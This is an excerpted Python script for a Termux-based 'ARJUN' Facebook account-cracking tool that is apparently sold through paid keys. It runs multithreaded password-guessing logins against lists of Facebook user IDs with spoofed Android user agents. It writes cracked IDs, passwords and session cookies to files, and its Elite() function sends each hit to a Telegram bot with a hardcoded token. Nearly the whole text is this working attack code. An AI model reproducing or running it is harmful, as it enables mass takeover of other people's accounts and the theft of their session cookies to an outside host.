...
os.system('clear')
print('         \x1b[38;5;46m WELCOME TO ARJUN WORLD          ')
...
def Elite(id,ps,coki):
    try:
        import requests
        token = "6866740673:AAFgXMJhyTOzUE5LBE--65DGJMFWBHMWbPk"#Add yout token 
        chatid = "5090959284"#Add your Chat Id
...
from concurrent.futures import ThreadPoolExecutor as SiamARJUN
from string import * 
...
totaldmp = 0
filter = []
os.system("xdg-open https://t.me/mrARJUNtermuxtool")
sys.stdout.write('\x1b]2; Mr:ARJUN\x07')
S = '\033[1;37m'
A = '\x1b[38;5;208m'
R = '\x1b[38;5;46m'
F = '\x1b[38;5;48m'
...
──────────────────────────────────────────────────
\033[1;92m Owner   :            MR:ARJUN
\033[1;92m Facebook:            Mr:ARJUN
\033[1;92m Github  :            Mr-ARJUN
...
def menu():   
  ...
  ###  elif select =='2':
       ...
       os.system('xdg-open https://t.me/+xTCzN93CRd03Yzhl');menu()
        ...
        time.sleep(2)
        ARJUN(allkey)
       # os.system('xdg-open https://wa.me/+91 7568053340')
#---------------------[ USER - AGENT ] -------------------#
def uaxxx():
...
class main_crack():
    ...
    def methodA(self, sid, name, psw):
        try:
            global oks,cps,loop
            sys.stdout.write(f'\r\r\33[1;92m [\33[1;92mARJUN-XD-M1\33[1;92m] %s | \033[1;92mOK:-%s  \033[1;92m'%(loop,len(oks)));sys.stdout.flush()
            sys.stdout.flush()
...
'Content-Length': str(len(content_lenght))}
                ...
                if 'session_key' in q:
                    ckkk = ";".join(i["name"]+"="+i["value"] for i in q["session_cookies"]);ARJUNb = base64.b64encode(os.urandom(18)).decode().replace("=","").replace("+","_").replace("/","-");cookie = f"sb={ARJUNb};{ckkk}"
                    print(f"\r{R} \x1b[38;5;196m[\033[38;5;46mARJUN-💚\x1b[38;5;196m] \x1b[38;5;46m{sid} \x1b[1;92m●\x1b[38;5;46m {ps} {S}\n=#={ckkk}")
                    
                    Elite(sid,ps,ckkk)
                    oks.append(sid)                 
                    open('/sdcard/ARJUN/OK_ids_M1.txt','a').write(sid+'●'+ps+'\n');open('/sdcard/ARJUN/COOKiEs_M1.txt','a').write(sid+'●'+ps+'●'+cookie+'\n')
                    break
                elif 'www.facebook.com' in q['error']['message']:
                     #print(f"\r\x1b[1;96m [ARJUN-CP] {sid} ● {ps} {S}")
                     cps.append(sid)
                     open('/sdcard/ARJUN/M1-CP.txt','a').write(sid+'●'+ps+'\n')
                else:
                    continue
            loop+=1
    ...
    def methodC(self, sid, name, psw):
        try:
            global oks,cps,loop
            sys.stdout.write(f'\r\r\33[1;92m [\33[1;92mARJUN-XD-M3\33[1;92m] %s | \033[1;92mOK:-%s  \033[1;92m'%(loop,len(oks)));sys.stdout.flush()
            sys.stdout.flush()
            android_version = f"Android {random.randint(4, 10)}.{random.randint(0, 9)}.{random.randint(0, 9)}"
            facebook_version = f'{random.randint(10,432)}.0.0.{random.randint(11,99)}.{random.randint(1,200)}'
            fbbv = str(random.randint(10000000, 99999999))
...
'Content-Length': str(len(content_lenght))}
                ...
                if 'session_key' in q:
                    ...
                    Elite(sid,ps,ckkk)
                    oks.append(sid)
                    open('/sdcard/ARJUN/OK_ids_M3.txt','a').write(sid+'|'+ps+'\n');open('/sdcard/ARJUN/COOKiEs_M3.txt','a').write(sid+'●'+ps+'●'+cookie+'\n')
                    break
                elif 'www.facebook.com' in q['error']['message']:
                   # print(f"\r\x1b[1;96m [ARJUN-CP] {sid} ● {ps} {S}")
                    cps.append(sid)
                    open('/sdcard/ARJUN/M3-CP.txt','a').write(sid+'●'+ps+'\n')
                else:
                    continue
            loop+=1
        except requests.exceptions.ConnectionError:
    ...
    def methodB(self, sid, name, psw):
        try:
            global oks,cps,loop
            sys.stdout.write(f'\r\r\33[1;92m [\33[1;92mARJUN-XD-M2\33[1;92m] %s | \033[1;92mOK:-%s  \033[1;92m'%(loop,len(oks)));sys.stdout.flush()
            sys.stdout.flush()
            android_version = f"Android {random.randint(4, 10)}.{random.randint(0, 9)}.{random.randint(0, 9)}"
            facebook_version = f'{random.randint(10,432)}.0.0.{random.randint(11,99)}.{random.randint(1,200)}'
            fbbv = str(random.randint(10000000, 99999999))
...
'Content-Length': str(len(content_lenght))}
                ...
                if 'session_key' in q:
                    ...
                    Elite(sid,ps,ckkk)
                    oks.append(sid)
                    open('/sdcard//ARJUN/OK_ids_M2.txt','a').write(sid+'●'+ps+'\n');open('/sdcard/ARJUN/COOKiEs_M2.txt','a').write(sid+'●'+ps+'●'+cookie+'\n')
                    break
                elif 'www.facebook.com' in q['error']['message']:
                    #print(f"\r\x1b[1;96m [ARJUN-CP] {sid} ● {ps} {S}")
                    cps.append(sid)
                    open('/sdcard/ARJUN/M2-CP.txt','a').write(sid+'●'+ps+'\n')
                else:
                    continue
            loop+=1
        except requests.exceptions.ConnectionError:
    ...
    def methodD(self, sid, name, psw):
        try:
            global oks,cps,loop
            sys.stdout.write(f'\r\r\33[1;92m [\33[1;92mARJUN-XD-M4\33[1;92m] %s | \033[1;92mOK:-%s  \033[1;92m'%(loop,len(oks)));sys.stdout.flush()
            sys.stdout.flush()
            android_version = f"Android {random.randint(4, 10)}.{random.randint(0, 9)}.{random.randint(0, 9)}"
            facebook_version = f'{random.randint(10,432)}.0.0.{random.randint(11,99)}.{random.randint(1,200)}'
            fbbv = str(random.randint(10000000, 99999999))
...
'Content-Length': str(len(content_lenght))}
                ...
                if 'session_key' in q:
                    ...
                    Elite(sid,ps,ckkk)
                    oks.append(sid)
                    open('/sdcard/ARJUN/OK_ids_M4.txt','a').write(sid+'●'+ps+'\n');open('/sdcard/ARJUN/COOKiEs_M2.txt','a').write(sid+'●'+ps+'●'+cookie+'\n')
                    break
                elif 'www.facebook.com' in q['error']['message']:
                  #    print(f"\r\x1b[1;96m [Fuck] {sid} | {ps} {S}")
                    cps.append(sid)
                    open('/sdcard//ARJUN/M4-CP.txt','a').write(sid+'●'+ps+'\n')
                else:
                    continue
            loop+=1
        except requests.exceptions.ConnectionError:
    ...
    def pasw(self):       
            ...
            print("\x1b[1;92m━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━")
            with SiamARJUN(max_workers=30) as ARJUNworld:
                for zsb in self.id:
                   try:
                       uid, name = zsb.split('|')
                       sz = name.split(' ')
                       if len(sz) == 3 or len(sz) == 4 or len(sz) == 5 or len(sz) == 8:
                           pwx =  pw
                            ...
                            if 'methodA' in methods:
                                ARJUNworld.submit(self.methodA, uid, name, pwx)
                            elif 'methodB' in methods:
                                ARJUNworld.submit(self.methodB, uid, name, pwx)
                            elif 'methodC' in methods:
                                ARJUNworld.submit(self.methodC, uid, name, pwx)
                            elif 'methodD' in methods:
                                ARJUNworld.submit(self.methodD, uid, name, pwx)
                   except:pass
            result(oks,cps)
...
def rcrack(uid,pwx,tl):
    ...
    'sec-ch-ua-mobile': '?1',
    'sec-ch-ua-model': '"InfiARJUN X678B"',
    ...
    'viewport-width': '980',
            ...
            if 'c_user' in log_cookies:
                ...
                cid = coki[151:166]
                print('\033[1;32m[ARJUN-OK] '+cid+' | '+ps+'\033[0;97m')
                print('\n[‎‎💖]\033[0;33m COOKIE = \033[1;34m'+coki+  '  ''  \033[0;97m')
                linex()
                open('ARJUN-OK.txt', 'a').write(cid+' | '+ps+ '\n')
                oks.append(cid)
                break
            elif 'checkpoint' in log_cookies:
                coki=";".join([key+"="+value for key,value in session.cookies.get_dict().items()])
                cid = coki[141:152]
                print('\033[1;31m[ARJUN-CP] '+uid+' | '+ps+'\x1b[1;97m')
                open('ARJUN-CP.txt', 'a').write(uid+' | '+ps+'\n')
                cps.append(cid)
                break
            else:
                continue
        loop+=1
        sys.stdout.write(f'\r\033[1;92m[ARJUN]\033[1;92m] %s|\33[1;31m[OK]:- %s \r'%(loop,len(oks))),
        sys.stdout.flush()
    except:
        pass 
############            
...
def main_apv():
    ...
    print(logo)
    uuid = str(os.geteuid())
    Xyteee=('ARJUN1x6b7b5c%s85b8n9nfdi%s'%(uuid,uuid))
    print(logo)
    os.system("clear");print(logo)
    print(f" Your Key : \x1b[1;31m"+Xyteee)
    print("\x1b[1;92m--------------------------------------------------")
    try:
        system = requests.get("https://github.com/Mrchiksa/surya/blob/main/APRUVAL-KEY.txt").text 
        if Xyteee in system:
            print()
            msg = str(os.geteuid()) 
            time.sleep(1) 
            ...
            print('\033[1;92m[\033[1;92m•\033[1;92m]\033[1;92m Notes : ARJUN Tools Can buy in all countries!')
            print('\033[1;92m-----------------------------------------------------\033[1;97m')
            ...
            print("-----------------------------------------------------")
            url_wa = "https://api.whatsapp.com/send?phone=+917568053340&text="
            choice = input(" Enter your choice  : ")
            tks = ("Hi ARJUN Sir, I Need To Buy Your ARJUN Tools Version 0.0.4 Premium Please Accept My Key To Premium\n\n Name : "+choice+"\n Key : "+Xyteee+"\n Buy Select : "+Picchi)
...
with SiamARJUN(max_workers=30) as rhu:
 #   rhu.submit(sexy)
    rhu.submit(main_apv)
